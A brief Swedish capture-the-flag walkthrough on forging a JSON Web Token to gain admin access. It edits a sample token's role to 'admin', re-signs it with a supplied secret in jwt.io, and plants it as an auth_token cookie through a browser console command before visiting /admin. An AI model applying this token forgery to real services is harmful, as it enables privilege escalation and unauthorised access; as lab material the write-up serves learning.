🧾 JWT Manipulation – Become Admin

🔄 Gör det direkt i jwt.io

Gå till jwt.io

Klistra in din JWT, t.ex.:

eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ICJ1c2VyIiwgInJvbGUiOiAidXNlciIsICJleHAiOiAxNzQxOTYxOTYzfQ.p2egRol2RTzmjCgiAffOba1htqma-RfEJC0ZtZsQcE0

Ändra payload:

"role": "admin"

Scrolla ner till "Verify Signature"

Radera hemligheten

Skriv istället: MAYCAQACAQA=

JWT:n blir nu signerad som admin – kopiera hela nya token.

💻 Använd JWT i webbläsaren:

Öppna DevTools → Console:

document.cookie = "auth_token=DIN_NYA_JWT_HÄR; path=/";

Gå till /admin

🏁 Får du flaggan? Yes!
